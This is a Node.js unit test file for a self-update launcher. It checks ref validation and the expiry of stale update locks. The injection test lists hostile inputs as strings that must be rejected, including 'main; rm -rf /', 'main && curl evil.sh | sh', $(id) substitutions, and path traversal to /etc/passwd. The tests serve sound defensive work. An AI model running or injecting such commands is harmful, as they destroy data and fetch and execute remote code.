// Self-update launcher. Runs with: node --test "tests/unit/*.test.js"
//
// Two things these tests exist to hold: a ref reaches a shell command inside
// the worker, so validation is a security control and not a nicety; and a
// worker killed mid-run must not leave the update button wedged forever.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { isValidRef, startUpdate, isUpdateInFlight, readUpdateStatus } from "../../src/lib/updater/launch.js";

// The launcher reads/writes <cwd>/.update-status, so each test gets its own cwd.
function inTempDir(fn) {
  const cwd = process.cwd();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nova-update-test-"));
  try {
    process.chdir(dir);
    return fn(dir);
  } finally {
    process.chdir(cwd);
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

function writeStatus(dir, status) {
  fs.mkdirSync(path.join(dir, ".update-status"), { recursive: true });
  fs.writeFileSync(path.join(dir, ".update-status", "status.json"), JSON.stringify(status));
}

test("a branch name may not smuggle shell syntax", () => {
  for (const ref of [
    "main; rm -rf /",
    "main && curl evil.sh | sh",
    "main`id`",
    "main$(id)",
    "main | tee /etc/passwd",
    "main\nrm -rf /",
    '"; systemctl stop novaroute; "',
    "",
  ]) {
    assert.equal(isValidRef("git", ref), false, `accepted: ${JSON.stringify(ref)}`);
  }
});

test("ordinary branch names are accepted", () => {
  for (const ref of ["main", "release/1.2", "feature-x", "v2.0.1", "a_b.c-d"]) {
    assert.equal(isValidRef("git", ref), true, `rejected: ${ref}`);
  }
});

test("a release tag may not contain a slash or shell syntax", () => {
  for (const ref of ["v1.0$(id)", "v1.0;id", "../../etc/passwd", "refs/tags/v1", ""]) {
    assert.equal(isValidRef("tag", ref), false, `accepted: ${JSON.stringify(ref)}`);
  }
  assert.equal(isValidRef("tag", "v1.2.3"), true);
});

test("an unknown mode is refused", () => {
  assert.equal(isValidRef("rsync", "main"), false);
  const res = startUpdate({ mode: "rsync", ref: "main" });
  assert.equal(res.ok, false);
  assert.equal(res.status, 400);
});

test("a bad ref is refused before anything else, on every platform", () => {
  const res = startUpdate({ mode: "git", ref: "main; id" });
  assert.equal(res.ok, false);
  assert.equal(res.status, 400);
  assert.match(res.error, /valid branch name/);
});

test("no status file reads as idle", () => {
  inTempDir(() => {
    assert.equal(readUpdateStatus(), null);
    assert.equal(isUpdateInFlight(), false);
  });
});

test("a running update is in flight", () => {
  inTempDir((dir) => {
    writeStatus(dir, { done: false, updatedAt: new Date().toISOString() });
    assert.equal(isUpdateInFlight(), true);
  });
});

test("a finished update is not in flight", () => {
  inTempDir((dir) => {
    writeStatus(dir, { done: true, updatedAt: new Date().toISOString() });
    assert.equal(isUpdateInFlight(), false);
  });
});

test("a worker killed mid-run does not wedge the button forever", () => {
  inTempDir((dir) => {
    // done:false, but nothing has touched it for an hour: the worker is gone.
    writeStatus(dir, { done: false, updatedAt: new Date(Date.now() - 60 * 60 * 1000).toISOString() });
    assert.equal(isUpdateInFlight(), false, "a stale lock must expire");
  });
});

test("a corrupt status file does not throw", () => {
  inTempDir((dir) => {
    fs.mkdirSync(path.join(dir, ".update-status"), { recursive: true });
    fs.writeFileSync(path.join(dir, ".update-status", "status.json"), "{not json");
    assert.equal(readUpdateStatus(), null);
    assert.equal(isUpdateInFlight(), false);
  });
});
